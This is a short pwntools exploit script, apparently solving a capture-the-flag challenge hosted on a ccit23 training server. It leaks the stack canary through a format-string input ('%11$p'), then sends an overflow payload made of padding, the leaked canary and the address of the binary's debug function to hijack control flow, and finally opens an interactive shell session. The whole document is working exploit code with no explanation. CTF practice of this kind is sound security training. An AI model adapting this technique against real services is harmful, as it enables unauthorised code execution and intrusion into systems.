from pwn import *

r = remote("ashell.ss2.ccit23.havce.it", 31353)

exe = ELF("./ex2.3")

r.sendlineafter(b"havce#", b"%11$p")

r.recvuntil("found: ")

canary = p64(int(r.recvline().strip(), 16))

print(canary)

payload = flat(
    b"A"*24,
    canary,
    b"B"*8,
    p64(exe.sym.debug)
)

r.sendlineafter("#", payload)

r.recvline()
r.recvline()

r.sendlineafter(b"#", b"exit")

r.interactive()